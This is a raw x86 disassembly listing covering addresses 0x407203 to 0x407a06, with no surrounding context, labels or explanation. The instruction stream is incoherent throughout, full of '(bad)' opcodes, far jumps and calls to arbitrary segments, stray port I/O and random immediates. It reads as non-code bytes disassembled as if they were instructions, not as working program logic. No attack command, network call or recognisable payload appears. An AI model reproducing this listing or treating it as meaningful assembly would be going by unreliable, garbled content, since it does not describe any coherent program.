  407203:	(bad)  [ecx]
  407205:	push   es
  407206:	mov    dh,0x75
  407208:	pop    DWORD PTR [eax]
  40720a:	mov    ds:0x3fe77658,eax
  40720f:	jb     0x4071df
  407211:	jo     0x40727b
  407213:	ins    DWORD PTR es:[edi],dx
  407214:	inc    edi
  407215:	sub    DWORD PTR [edx-0x73],ecx
  407218:	add    BYTE PTR [ebx],dl
  40721a:	add    eax,0x9a3c8c17
  40721f:	mov    bl,0x3c
  407221:	inc    eax
  407222:	nop
  407223:	call   0x8f76:0x1cb197b7
  40722a:	jae    0x4071fc
  40722c:	and    eax,0x560635cd
  407231:	ds inc esi
  407233:	(bad)  
  407234:	jns    0x40729c
  407236:	mov    esp,edx
  407238:	push   ebx
  407239:	aad    0x46
  40723b:	rcr    edx,0xc4
  40723e:	or     BYTE PTR [edi],dl
  407240:	sub    al,0xcb
  407242:	cmp    al,0x3a
  407244:	sub    edx,ecx
  407246:	add    eax,0xeda1a905
  40724b:	xor    edi,edi
  40724d:	loopne 0x4071d5
  40724f:	jge    0x4072ac
  407251:	mov    al,ds:0xe6e2a457
  407256:	push   esp
  407257:	inc    ebx
  407258:	aam    0x9a
  40725a:	push   es
  40725b:	enter  0xe3f6,0x26
  40725f:	mov    ds:0xdca3273,eax
  407264:	aad    0xa
  407266:	push   ss
  407267:	in     al,0x84
  407269:	push   ss
  40726a:	(bad)  
  40726b:	or     cl,BYTE PTR [eax-0x43]
  40726e:	jns    0x4072bc
  407270:	fcom   QWORD PTR [esi-0x13]
  407273:	nop
  407274:	hlt    
  407275:	mov    esp,0xc8cbee81
  40727a:	fldcw  WORD PTR ds:0x55a0ca6c
  407280:	xor    eax,0x9b68ad83
  407285:	cdq    
  407286:	xor    DWORD PTR [eax],0x13
  407289:	call   0x3fe80b4d
  40728e:	sbb    eax,0x247a299c
  407293:	pop    ds
  407294:	or     esi,ecx
  407296:	mov    esi,0x903c6da9
  40729b:	lahf   
  40729c:	(bad)  
  40729d:	push   ss
  40729e:	int3   
  40729f:	push   edx
  4072a0:	dec    edx
  4072a1:	loop   0x4072fb
  4072a3:	cld    
  4072a4:	idiv   BYTE PTR [eax-0x71a52943]
  4072aa:	mov    DWORD PTR [ebx-0x20],esi
  4072ad:	jecxz  0x407313
  4072af:	dec    ecx
  4072b0:	mov    cl,0x39
  4072b2:	pop    edx
  4072b3:	fdiv   DWORD PTR [esi]
  4072b5:	mov    eax,ds:0x5afadb1e
  4072ba:	dec    esp
  4072bb:	ret    
  4072bc:	scas   eax,DWORD PTR es:[edi]
  4072bd:	mov    fs,WORD PTR [edx+0x7a6c7c72]
  4072c3:	scas   al,BYTE PTR es:[edi]
  4072c4:	add    al,0x85
  4072c6:	div    BYTE PTR [ecx-0x4e]
  4072c9:	jo     0x407257
  4072cb:	in     al,0xd9
  4072cd:	sub    eax,0x743584b0
  4072d2:	jge    0x40734c
  4072d4:	stc    
  4072d5:	aaa    
  4072d6:	mov    eax,ds:0xdfe6604c
  4072db:	jb     0x4072c0
  4072dd:	mov    DWORD PTR [ecx-0x20],edx
  4072e0:	dec    ebp
  4072e1:	xchg   ebp,eax
  4072e2:	retf   0xb77f
  4072e5:	retf   
  4072e6:	inc    edi
  4072e7:	stos   BYTE PTR es:[edi],al
  4072e8:	push   eax
  4072e9:	jl     0x4072ee
  4072eb:	in     al,0x56
  4072ed:	jnp    0x4072ce
  4072ef:	es and al,0x77
  4072f2:	jnp    0x407301
  4072f4:	cmp    edi,esi
  4072f6:	or     ch,ch
  4072f8:	inc    eax
  4072f9:	popf   
  4072fa:	es mov edx,0x8db2aa3b
  407300:	iret   
  407301:	cmp    ebp,DWORD PTR [ebp+0x6f04588b]
  407307:	enter  0x2675,0x26
  40730b:	lock imul edi,DWORD PTR [ebp-0x4f],0x4d835c57
  407313:	sbb    DWORD PTR [edx+0xa5d478c],edi
  407319:	mov    al,ds:0x68f866ea
  40731e:	ret    0xc3b0
  407321:	lahf   
  407322:	outs   dx,BYTE PTR ds:[esi]
  407323:	leave  
  407324:	mov    dl,BYTE PTR [esi+eiz*2+0x2131bd95]
  40732b:	push   edi
  40732c:	or     ch,bh
  40732e:	cmp    eax,DWORD PTR [esi-0x17129aa8]
  407334:	fdivr  DWORD PTR [ecx+0x10]
  407337:	pop    esp
  407338:	jno    0x4072cd
  40733a:	xchg   cl,cl
  40733c:	adc    DWORD PTR [esi+0x3521dec4],esp
  407342:	pop    eax
  407343:	dec    edi
  407344:	arpl   cx,sp
  407346:	inc    edi
  407347:	mov    ch,0xcd
  407349:	xchg   esi,eax
  40734a:	inc    eax
  40734b:	pop    ds
  40734c:	pusha  
  40734d:	pop    edi
  40734e:	mov    ch,0x96
  407350:	pusha  
  407351:	in     al,0x12
  407353:	and    DWORD PTR [eax-0x156ea264],ebx
  407359:	mul    BYTE PTR [eax]
  40735b:	sub    cl,bh
  40735d:	jle    0x4073c1
  40735f:	lods   al,BYTE PTR ds:[esi]
  407360:	in     eax,dx
  407361:	aaa    
  407362:	xchg   esi,eax
  407363:	xchg   ebp,eax
  407364:	dec    ebp
  407365:	add    eax,0xd388c37a
  40736a:	inc    ecx
  40736b:	sbb    BYTE PTR [esi],ch
  40736d:	(bad)  
  40736e:	xor    DWORD PTR [edx-0x20a6428f],ecx
  407374:	pop    ds
  407375:	mov    cl,dl
  407377:	outs   dx,DWORD PTR ds:[esi]
  407378:	repnz inc esi
  40737a:	jno    0x407372
  40737c:	or     DWORD PTR [di+0x62],edi
  407380:	inc    esp
  407381:	sbb    bh,bh
  407383:	(bad)  
  407384:	call   0xed377217
  407389:	popa   
  40738a:	bound  edx,QWORD PTR [edi+ebx*2+0x5c]
  40738e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40738f:	push   es
  407390:	push   edx
  407391:	jne    0x407315
  407393:	mov    eax,0xfa34d904
  407398:	push   edx
  407399:	gs mov dh,0x63
  40739c:	push   0xfd592bb0
  4073a1:	push   es
  4073a2:	jp     0x407384
  4073a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4073a5:	dec    edi
  4073a6:	sbb    DWORD PTR [esp+edx*8-0x76c62c10],eax
  4073ad:	mov    BYTE PTR [edi+eax*2],bl
  4073b0:	mul    BYTE PTR [edx+edi*8+0x76]
  4073b4:	or     DWORD PTR [ebp-0x5c5a5eb3],0xffffffac
  4073bb:	mov    ss,WORD PTR [edx+ebx*4+0x2e]
  4073bf:	push   ecx
  4073c0:	stos   BYTE PTR es:[edi],al
  4073c1:	push   ebx
  4073c2:	fldcw  WORD PTR [esi+eax*8]
  4073c5:	pop    esi
  4073c6:	mov    eax,ds:0x8d5f866d
  4073cb:	dec    ecx
  4073cc:	jg     0x407369
  4073ce:	inc    eax
  4073cf:	test   ah,bl
  4073d1:	and    al,0x40
  4073d3:	in     al,0x59
  4073d5:	sub    edx,esi
  4073d7:	sub    ah,ah
  4073d9:	xchg   edx,eax
  4073da:	outs   dx,DWORD PTR ds:[esi]
  4073db:	fnstsw WORD PTR [esi-0x787defe7]
  4073e1:	xor    al,0x2
  4073e3:	in     eax,dx
  4073e4:	jg     0x40736d
  4073e6:	push   es
  4073e7:	dec    edi
  4073e8:	dec    ecx
  4073e9:	and    ecx,ebx
  4073eb:	ret    
  4073ec:	xlat   BYTE PTR ds:[ebx]
  4073ed:	jae    0x40746b
  4073ef:	adc    BYTE PTR [edi+0x47842c91],bh
  4073f5:	mov    esi,0x99f4711b
  4073fa:	inc    esi
  4073fb:	inc    edi
  4073fc:	add    eax,0x577234a1
  407401:	loope  0x407388
  407403:	adc    esi,DWORD PTR [eax-0x73166bcb]
  407409:	xor    BYTE PTR [esi],bh
  40740b:	and    eax,0xe7cf7aa
  407410:	sub    BYTE PTR [ecx],cl
  407412:	outs   dx,BYTE PTR ds:[esi]
  407413:	test   eax,0x84f22f8f
  407418:	or     eax,DWORD PTR [edx]
  40741a:	shl    DWORD PTR [ebp-0x4c0bc000],1
  407420:	or     dh,BYTE PTR [ebx+0x7f]
  407423:	pop    eax
  407424:	loope  0x407489
  407426:	int    0xf1
  407428:	sub    ch,BYTE PTR [eax]
  40742a:	jnp    0x4073c8
  40742c:	dec    esp
  40742d:	mov    ?,WORD PTR [ebx-0x1b]
  407430:	popa   
  407431:	or     edi,esp
  407433:	dec    edi
  407434:	cmp    al,0x71
  407436:	add    bh,BYTE PTR ss:[eax]
  407439:	std    
  40743a:	retf   
  40743b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40743c:	js     0x4074b9
  40743e:	xor    eax,0x1ebdeb03
  407443:	(bad)
  407446:	sub    DWORD PTR [edx],esp
  407448:	int    0x19
  40744a:	retf   
  40744b:	clc    
  40744c:	adc    BYTE PTR [ebp-0x49],bl
  40744f:	sahf   
  407450:	(bad)  
  407451:	rcl    BYTE PTR [edi+ecx*4],1
  407454:	ins    DWORD PTR es:[edi],dx
  407455:	xchg   ebx,eax
  407456:	out    dx,eax
  407457:	add    ah,BYTE PTR [esi+0x2e48f26a]
  40745d:	and    eax,0xd6aaec0f
  407462:	xchg   ecx,eax
  407463:	ror    al,1
  407465:	imul   BYTE PTR [edi+ebp*4]
  407468:	xor    ch,BYTE PTR [ecx-0x34]
  40746b:	jbe    0x407498
  40746d:	xchg   ecx,eax
  40746e:	cmp    eax,0x2fa4494d
  407473:	add    eax,edx
  407475:	inc    eax
  407476:	xchg   esi,eax
  407477:	add    al,0xda
  407479:	in     eax,dx
  40747a:	mov    dl,0x5a
  40747c:	outs   dx,BYTE PTR ds:[esi]
  40747d:	(bad)  
  40747e:	in     eax,dx
  40747f:	(bad)  
  407480:	sti    
  407481:	adc    eax,DWORD PTR [edx+eiz*2]
  407484:	ret    0x5950
  407487:	xor    DWORD PTR [eax+edi*1+0xc2f34e8],0x5f
  40748f:	cdq    
  407490:	fld    DWORD PTR [eax-0x15f7065]
  407496:	test   BYTE PTR [ebx],ch
  407498:	loop   0x407487
  40749a:	jbe    0x40750f
  40749c:	dec    ebp
  40749d:	add    esp,DWORD PTR [ebx-0x27]
  4074a0:	sub    ecx,DWORD PTR [ecx+0x3e]
  4074a3:	mov    DWORD PTR [ecx+ecx*1+0x17dbfbbb],eax
  4074aa:	ret    0xca23
  4074ad:	shl    DWORD PTR [edi-0x33baf71c],1
  4074b3:	jmp    0x1165:0x165d2bc8
  4074ba:	sub    DWORD PTR [ecx+0x63],eax
  4074bd:	hlt    
  4074be:	pop    ecx
  4074bf:	adc    DWORD PTR [edx+0x2813cac7],ebx
  4074c5:	jbe    0x4074f9
  4074c7:	xchg   edi,eax
  4074c8:	cmp    eax,0x510522ff
  4074cd:	sar    BYTE PTR [eax+0x46],1
  4074d0:	pop    ecx
  4074d1:	add    al,0x87
  4074d3:	add    BYTE PTR [esi-0x36],ch
  4074d6:	call   0x2edd067a
  4074db:	cmp    edi,ebx
  4074dd:	jnp    0x4074b7
  4074df:	and    eax,0x979c2b20
  4074e4:	cmp    al,0x64
  4074e6:	mov    cl,0xdf
  4074e8:	jo     0x40747b
  4074ea:	adc    dl,BYTE PTR [edx+esi*2]
  4074ed:	xchg   ebp,eax
  4074ee:	rcr    DWORD PTR [edx-0x3714aaad],0xc7
  4074f5:	mov    ebx,0x1a94872d
  4074fa:	sub    eax,0x60038def
  4074ff:	stc    
  407500:	clc    
  407501:	xchg   edi,eax
  407502:	in     al,dx
  407503:	ficom  DWORD PTR [edx+0x7e]
  407506:	rcl    DWORD PTR [eax+0xf0e268d],0x26
  40750d:	pusha  
  40750e:	mov    bh,0xfd
  407510:	stos   BYTE PTR es:[edi],al
  407511:	mov    al,BYTE PTR [ebp+0x17]
  407514:	mov    dl,0xe8
  407516:	or     bh,BYTE PTR [edi+0x24174f98]
  40751c:	daa    
  40751d:	mov    dh,0x9d
  407520:	jne    0x40753c
  407522:	jecxz  0x407543
  407524:	push   ecx
  407525:	adc    eax,0x22cc77e2
  40752a:	sahf   
  40752b:	or     DWORD PTR [esi],0x2c09efc1
  407531:	ss int3 
  407533:	jg     0x407596
  407535:	jno    0x407511
  407537:	hlt    
  407538:	and    BYTE PTR [esi+0x3c],0x4d
  40753c:	dec    edi
  40753d:	call   0xcdf3d7b6
  407542:	jmp    0xb2aa:0xfa00e6a6
  407549:	ss lahf 
  40754b:	push   ss
  40754c:	arpl   WORD PTR [edx+0x63],si
  40754f:	add    bl,BYTE PTR [ecx]
  407551:	loopne 0x407528
  407553:	ret    
  407554:	ins    BYTE PTR es:[edi],dx
  407555:	mov    bl,0xd1
  407557:	or     BYTE PTR [ecx],ah
  407559:	mov    BYTE PTR [eax+0x38],0x22
  40755d:	xchg   edi,eax
  40755e:	aad    0x2e
  407560:	sbb    al,0x16
  407562:	push   ss
  407563:	mov    gs,esi
  407565:	jns    0x40753f
  407567:	cmp    edx,ebp
  407569:	or     eax,ebp
  40756b:	jmp    0x8ce18be3
  407570:	sbb    edx,esi
  407572:	lock loope 0x40755e
  407575:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407576:	add    eax,0xf425199
  40757b:	mov    cs,WORD PTR [ecx]
  40757d:	cld    
  40757e:	dec    esi
  40757f:	out    0xa8,al
  407581:	fadd   st,st(7)
  407583:	lods   eax,DWORD PTR ds:[esi]
  407584:	mov    ebx,0xa8cefa48
  407589:	jmp    DWORD PTR fs:[esi]
  40758c:	les    ebx,FWORD PTR [edi]
  40758e:	shl    DWORD PTR [esp+esi*2],1
  407591:	dec    edi
  407592:	xchg   ebx,ecx
  407594:	(bad)  
  407595:	bound  ebx,QWORD PTR [eax]
  407597:	in     al,dx
  407598:	outs   dx,DWORD PTR ds:[esi]
  407599:	out    0x9,eax
  40759b:	test   al,0xfe
  40759d:	dec    DWORD PTR [esi-0x48]
  4075a0:	jmp    0xb349:0xa800376c
  4075a7:	inc    ebp
  4075a8:	inc    ebp
  4075a9:	and    BYTE PTR [eax+ecx*2],dl
  4075ac:	jp     0x407616
  4075ae:	test   eax,0x5463f1c7
  4075b3:	xchg   ecx,eax
  4075b4:	rol    BYTE PTR [edi-0x78c8185d],1
  4075ba:	pop    ss
  4075bb:	sub    dh,dl
  4075bd:	pop    es
  4075be:	inc    esi
  4075bf:	mov    BYTE PTR [edi+0x4b0a6db],dl
  4075c5:	ret    0x37f2
  4075c8:	mov    ecx,0xf9efcddc
  4075cd:	jg     0x4075d6
  4075cf:	ins    DWORD PTR es:[edi],dx
  4075d0:	and    dh,0xb0
  4075d3:	rol    ch,cl
  4075d5:	mov    ch,0x24
  4075d7:	imul   esi,DWORD PTR [edx-0x4],0x47a14571
  4075de:	test   dh,bl
  4075e0:	push   0xac974691
  4075e5:	dec    edx
  4075e6:	mov    ds,edi
  4075e8:	nop
  4075e9:	arpl   WORD PTR [ebx],cx
  4075eb:	inc    edx
  4075ec:	push   eax
  4075ed:	mov    dh,BYTE PTR [ebp+0x4ff08ee1]
  4075f3:	sub    al,0x56
  4075f5:	stc    
  4075f6:	cmp    edx,DWORD PTR [ebx-0x49382a63]
  4075fc:	mov    ds:0xd7273a94,eax
  407601:	out    dx,al
  407602:	fidiv  WORD PTR [eax-0x1bb6d9f1]
  407608:	add    eax,0x25f735b1
  40760d:	and    DWORD PTR [ebp-0x6d923070],edx
  407613:	jle    0x4075fe
  407615:	fnstsw WORD PTR [esi-0x59d632de]
  40761b:	push   cs
  40761c:	(bad)  
  40761f:	mov    dh,0xbe
  407621:	imul   ebx,DWORD PTR [ecx],0x7d
  407624:	inc    edx
  407625:	xchg   DWORD PTR [edx+0x50],esi
  407628:	xchg   dl,ah
  40762a:	test   BYTE PTR [ebx-0x51],0x94
  40762e:	add    esi,0xffffff9d
  407631:	dec    ecx
  407632:	rcl    BYTE PTR [esi],0xfc
  407635:	outs   dx,BYTE PTR ds:[esi]
  407636:	push   esp
  407637:	push   eax
  407638:	adc    BYTE PTR [esi-0x1630fd74],al
  40763e:	xor    ecx,DWORD PTR [esi]
  407640:	repnz and DWORD PTR [ecx+0x5c00d92e],ecx
  407647:	mov    al,ds:0xbd3f27d0
  40764c:	mov    esp,0xcbdd537b
  407651:	jmp    0x407668
  407653:	mov    ecx,0x5d71e9ea
  407658:	aaa    
  407659:	stos   BYTE PTR es:[edi],al
  40765a:	sub    bh,BYTE PTR [esi-0x7d66822b]
  407660:	jno    0x407618
  407662:	mov    ch,0xe2
  407664:	js     0x407661
  407666:	lea    ecx,[ebp-0x7d]
  407669:	xor    bh,al
  40766b:	(bad)  
  40766c:	xor    ecx,ecx
  40766e:	inc    edi
  40766f:	hlt    
  407670:	jg     0x407633
  407672:	int3   
  407673:	cmp    bh,BYTE PTR [ebp+eax*8+0xc]
  407677:	mov    al,ds:0x8c15fec1
  40767c:	or     al,0x20
  40767e:	ret    
  40767f:	outs   dx,BYTE PTR ds:[esi]
  407680:	add    al,0x79
  407682:	cmc    
  407683:	xor    al,0xa
  407685:	and    bh,al
  407687:	arpl   WORD PTR [ebp+0x3823eb74],di
  40768d:	mov    cl,0xe9
  40768f:	fild   QWORD PTR [eax-0x55]
  407692:	out    dx,eax
  407693:	cmp    ah,bh
  407695:	mov    edi,0x68b54ec4
  40769a:	dec    edi
  40769b:	call   0xf599511
  4076a0:	adc    BYTE PTR [bp-0x1d],ah
  4076a4:	enter  0x645b,0xa5
  4076a8:	cmp    BYTE PTR [edi+0xf],al
  4076ab:	dec    edi
  4076ac:	add    al,0xf9
  4076ae:	xchg   esi,eax
  4076af:	dec    DWORD PTR [ecx]
  4076b1:	inc    ecx
  4076b2:	mov    edx,0x4ff6a61b
  4076b7:	mov    ds:0x5dbeb933,al
  4076bc:	fcomi  st,st(5)
  4076be:	loopne 0x4076cc
  4076c0:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  4076c2:	repz (bad) 
  4076c4:	sbb    eax,0x32170fc
  4076c9:	mov    cl,0x66
  4076cb:	das    
  4076cc:	jnp    0x40771f
  4076ce:	jmp    0x8c89:0x14247826
  4076d5:	xchg   edx,eax
  4076d6:	mov    ecx,0xece927ee
  4076db:	mov    esp,0xc6592957
  4076e0:	xchg   ebx,eax
  4076e1:	cli    
  4076e2:	mov    ds:0xb94940e2,eax
  4076e7:	mov    al,0x8f
  4076e9:	push   ebp
  4076ea:	cwde   
  4076eb:	mov    cl,BYTE PTR [esi+0x201b3ff6]
  4076f1:	dec    esi
  4076f2:	arpl   WORD PTR [edi],di
  4076f4:	inc    edi
  4076f5:	pop    edx
  4076f6:	or     al,0xda
  4076f8:	cmc    
  4076f9:	pop    esp
  4076fa:	sub    eax,0x8e0d170
  4076ff:	imul   ebp,DWORD PTR [edx],0xffffffc2
  407702:	add    eax,0x392cd0c0
  407707:	cmp    al,0x1c
  407709:	add    eax,0x10f5987c
  40770e:	dec    edx
  40770f:	rcr    al,cl
  407711:	cmp    DWORD PTR [ebp-0x6a818868],ebx
  407717:	inc    ebx
  407718:	stos   DWORD PTR es:[edi],eax
  407719:	sti    
  40771a:	hlt    
  40771b:	inc    BYTE PTR [ebp+0x17302a45]
  407721:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407722:	in     eax,dx
  407723:	aaa    
  407724:	pop    ebx
  407725:	cwde   
  407726:	xor    eax,0xad67380a
  40772b:	jns    0x407731
  40772d:	dec    ecx
  40772e:	loopne 0x4076c4
  407730:	adc    BYTE PTR [edi+0x5e],0xcf
  407734:	ins    BYTE PTR es:[edi],dx
  407735:	sbb    eax,0x329d4b7
  40773a:	pop    ds
  40773b:	(bad)  
  40773c:	ret    0x7382
  40773f:	jbe    0x407729
  407741:	retf   0x389b
  407744:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407745:	xor    eax,0x3a96f68f
  40774a:	outs   dx,DWORD PTR ds:[esi]
  40774b:	pop    ebx
  40774c:	pop    edx
  40774d:	cmp    ebx,DWORD PTR [edx+0xe]
  407750:	jl     0x4076fe
  407752:	xlat   BYTE PTR ds:[ebx]
  407753:	test   DWORD PTR [ecx-0x34],ecx
  407756:	push   ss
  407757:	nop
  407758:	mov    ?,esi
  40775a:	in     eax,dx
  40775b:	je     0x407794
  40775d:	jnp    0x4077bc
  40775f:	jmp    0xd8a8e59e
  407764:	aad    0xdb
  407766:	pop    eax
  407767:	xor    eax,0xd41e05c7
  40776c:	dec    edi
  40776d:	adc    eax,0xea94a2c4
  407772:	test   eax,0x2cb439a
  407777:	cmp    al,BYTE PTR [edx]
  407779:	jo     0x407789
  40777b:	jmp    0xf86c09a1
  407780:	lds    ecx,FWORD PTR [eax+0xa0d5f3f]
  407786:	or     BYTE PTR [ebp+esi*4+0x4158aed2],bl
  40778d:	cli    
  40778e:	repz inc ebx
  407790:	(bad)  
  407791:	daa    
  407792:	mov    cl,0x31
  407794:	ja     0x407752
  407796:	cwde   
  407797:	xor    eax,0x49dfc5b3
  40779c:	cdq    
  40779d:	popf   
  40779e:	sbb    DWORD PTR [edi-0x33],ebx
  4077a1:	ret    0x245
  4077a4:	xor    al,0xc7
  4077a6:	jmp    0x40777b
  4077a8:	out    0x98,al
  4077aa:	mov    BYTE PTR [eax],ch
  4077ac:	xchg   edx,eax
  4077ad:	push   ebp
  4077ae:	in     al,0x18
  4077b0:	ins    DWORD PTR es:[edi],dx
  4077b1:	aaa    
  4077b2:	gs push edi
  4077b4:	(bad)  
  4077b5:	mov    eax,0x7bc69e59
  4077ba:	sub    bh,ah
  4077bc:	add    al,0x8b
  4077be:	aas    
  4077bf:	les    ecx,FWORD PTR [ebx-0x7a]
  4077c2:	jge    0x4077c3
  4077c4:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4077c6:	mov    dl,0x30
  4077c8:	jae    0x40779d
  4077ca:	enter  0xc363,0x5f
  4077ce:	add    DWORD PTR [edi+0x5e1150d9],ebp
  4077d4:	mov    eax,ds:0x93c3cc28
  4077d9:	stc    
  4077da:	dec    ebx
  4077db:	(bad)  
  4077dc:	jg     0x4077cc
  4077de:	aad    0xe5
  4077e0:	sub    edx,esi
  4077e2:	push   esi
  4077e3:	lock and ebp,edi
  4077e6:	inc    eax
  4077e7:	dec    ebp
  4077e8:	pop    ecx
  4077e9:	mov    ds:0x310f9dfa,eax
  4077ee:	push   0xffffff9b
  4077f0:	jle    0x40786c
  4077f2:	sbb    ecx,eax
  4077f4:	bswap  ebp
  4077f6:	pop    edx
  4077f7:	sahf   
  4077f8:	fsubrp st(5),st
  4077fa:	iret   
  4077fb:	ds js  0x4077d5
  4077fe:	outs   dx,BYTE PTR ds:[esi]
  4077ff:	cmp    DWORD PTR [edi+ebp*4],edx
  407802:	icebp  
  407803:	ins    BYTE PTR es:[edi],dx
  407804:	sub    BYTE PTR [edi],al
  407806:	pcmpeqb mm3,mm1
  407809:	mov    edx,0x161f173
  40780e:	call   FWORD PTR [eax+0x75206c88]
  407814:	inc    eax
  407815:	jmp    0x40780d
  407817:	in     al,0xfc
  407819:	xor    eax,0x982329de
  40781e:	push   0x709fd909
  407823:	cs cmc 
  407825:	mov    al,ds:0xedb23ba
  40782a:	scas   al,BYTE PTR es:[edi]
  40782b:	push   eax
  40782c:	pop    eax
  40782d:	fwait
  40782e:	aas    
  40782f:	das    
  407830:	jmp    0x4077e5
  407832:	repz push ebx
  407834:	fnstenv [esi+0xda9638a]
  40783a:	xchg   esi,eax
  40783b:	mov    ebx,0x7e9bfd5b
  407840:	cld    
  407841:	(bad)  
  407842:	push   ecx
  407843:	mov    dl,0x7c
  407845:	pop    edx
  407846:	push   cs
  407847:	mov    ebp,0x2274b90c
  40784c:	adc    DWORD PTR [esi+0x65b0739d],edi
  407852:	jmp    0x4077d7
  407854:	imul   esi,DWORD PTR [esi],0xffffff90
  407857:	pop    ecx
  407858:	mov    ds:0x5e219c8c,eax
  40785d:	mov    al,ds:0xdd37220d
  407862:	jnp    0x4078be
  407864:	cmp    BYTE PTR [ecx-0x62391851],cl
  40786a:	sub    eax,0x1e825c1d
  40786f:	jmp    0xfb6dd96e
  407874:	mov    esi,0x8f048617
  407879:	jecxz  0x4078c2
  40787b:	or     al,0x15
  40787d:	mov    DWORD PTR [ebp-0x8],edi
  407880:	sub    BYTE PTR [eax-0x231cf314],0x8d
  407887:	mov    ds:0xb66cf23e,eax
  40788c:	or     al,0x61
  40788e:	imul   edi,DWORD PTR [edx+0x8],0xffffffe7
  407892:	loopne 0x40789a
  407894:	call   0xb540:0x28c047b9
  40789b:	inc    esi
  40789c:	into   
  40789d:	mov    bl,0xd9
  40789f:	mov    eax,ds:0xd11103dd
  4078a4:	dec    edi
  4078a5:	dec    ecx
  4078a6:	outs   dx,DWORD PTR ds:[esi]
  4078a7:	push   edi
  4078a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4078a9:	daa    
  4078aa:	ror    esp,cl
  4078ac:	nop
  4078ad:	cmc    
  4078ae:	ficom  DWORD PTR [esi]
  4078b0:	push   eax
  4078b1:	xor    edx,ecx
  4078b3:	dec    esi
  4078b4:	int3   
  4078b5:	cwde   
  4078b6:	sar    BYTE PTR [esi-0x5d],1
  4078b9:	xchg   DWORD PTR [eax+0x31bef2f],ecx
  4078bf:	cld    
  4078c0:	int3   
  4078c1:	adc    DWORD PTR [eax],esp
  4078c3:	adc    ah,BYTE PTR [ecx-0x7a857719]
  4078c9:	sbb    ah,ch
  4078cb:	sub    al,0x8f
  4078cd:	imul   edx,DWORD PTR [edi+0x13751b09],0xffffff97
  4078d4:	shl    bh,1
  4078d6:	add    BYTE PTR [edx-0x63],al
  4078d9:	jge    0x407860
  4078db:	lock adc BYTE PTR [edi-0x28],al
  4078df:	loopne 0x40795a
  4078e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4078e2:	and    eax,0x85e2fa0
  4078e7:	xchg   ebx,eax
  4078e8:	out    0xc6,al
  4078ea:	mov    edi,0x9c9d4d8d
  4078ef:	sbb    eax,0xcf49fc1a
  4078f4:	pop    ecx
  4078f5:	fs adc ch,bh
  4078f8:	in     al,dx
  4078f9:	repnz cmp esp,eax
  4078fc:	xchg   esi,eax
  4078fd:	lods   al,BYTE PTR ds:[esi]
  4078fe:	idiv   DWORD PTR [edx+0x71bb5f4b]
  407904:	xchg   dh,bl
  407906:	retf   0xaae8
  407909:	je     0x4078a5
  40790b:	mov    dl,0xcf
  40790d:	scas   eax,DWORD PTR es:[edi]
  40790e:	mov    fs,WORD PTR [edx+0x35]
  407911:	add    ah,dh
  407913:	dec    ebx
  407914:	aam    0x5c
  407916:	xchg   BYTE PTR [eax],dh
  407918:	retf   
  407919:	jb     0x4078fe
  40791b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40791c:	fwait
  40791d:	inc    esp
  40791e:	sti    
  40791f:	xor    DWORD PTR [ebp+0x3f1b896e],esi
  407925:	adc    cl,BYTE PTR [ecx]
  407927:	dec    esi
  407928:	add    DWORD PTR ds:0xf7d4fe5c,esp
  40792e:	sbb    ch,ch
  407930:	cmp    dh,BYTE PTR [esi]
  407932:	loope  0x40791b
  407934:	inc    ebp
  407935:	nop
  407936:	jmp    0xa989df3c
  40793b:	xchg   edx,eax
  40793c:	sbb    BYTE PTR fs:[esi+0x69634708],al
  407943:	call   0x317ff5f8
  407948:	jmp    0x1739:0xc3cac6bc
  40794f:	not    ah
  407951:	enter  0xb2c0,0x1d
  407955:	xor    DWORD PTR [ebx],0xfe303565
  40795b:	je     0x407956
  40795d:	arpl   dx,di
  40795f:	push   es
  407960:	test   ecx,0x502aa2e2
  407966:	test   al,0x25
  407968:	cmp    ch,BYTE PTR [ecx+ebx*1-0x24]
  40796c:	jmp    DWORD PTR [edi+ebx*2-0x62]
  407970:	cs lea edx,es:[edx+0x1b]
  407975:	cmp    ah,BYTE PTR [ecx]
  407977:	out    dx,al
  407978:	jne    0x40793c
  40797a:	test   BYTE PTR [edx+0x33],dl
  40797d:	push   esp
  40797e:	or     eax,0x9b991375
  407983:	sbb    edx,DWORD PTR [ebp-0x26d27e08]
  407989:	adc    bl,BYTE PTR [ebp+0x30]
  40798c:	imul   ecx,ecx,0x598c6b4b
  407992:	and    al,0x6e
  407994:	push   0x4f489e67
  407999:	mov    ch,0xf1
  40799b:	imul   ecx,edi,0x9
  40799e:	pop    ss
  40799f:	pop    esi
  4079a0:	mov    ds:0x5fd304b9,eax
  4079a5:	or     BYTE PTR [eax+ebp*4-0x4650f2a5],ah
  4079ac:	icebp  
  4079ad:	xor    eax,0x19b9e429
  4079b2:	cmp    bl,al
  4079b4:	cwde   
  4079b5:	sbb    esp,esp
  4079b7:	retf   0xe22e
  4079ba:	(bad)  
  4079bb:	dec    ebx
  4079bc:	pop    eax
  4079bd:	das    
  4079be:	dec    edx
  4079bf:	call   0xc3e0ea66
  4079c4:	push   es
  4079c5:	fcmovbe st,st(6)
  4079c7:	leave  
  4079c8:	or     eax,0x544b73b4
  4079cd:	das    
  4079ce:	mov    ebp,0x5c8dba7b
  4079d3:	xchg   edx,eax
  4079d4:	ret    
  4079d5:	repnz enter 0x2bcb,0x5b
  4079da:	cld    
  4079db:	and    eax,0xc6cd054d
  4079e0:	inc    ebx
  4079e1:	inc    ebp
  4079e2:	inc    ebp
  4079e3:	fstp   QWORD PTR [ebx+0x43]
  4079e6:	hlt    
  4079e7:	sub    esp,DWORD PTR ds:0xb786d784
  4079ed:	xchg   esi,eax
  4079ee:	cmp    al,BYTE PTR [eax-0x4e6da31c]
  4079f4:	mov    bl,0xb
  4079f6:	dec    ecx
  4079f7:	nop
  4079f8:	inc    ecx
  4079f9:	jp     0x407a7a
  4079fb:	inc    eax
  4079fc:	std    
  4079fd:	push   0xb123ab5d
  407a02:	lods   al,BYTE PTR ds:[esi]
  407a03:	or     al,BYTE PTR [edx-0x4d]
  407a06:	call   0x8261:0xf82a5b91
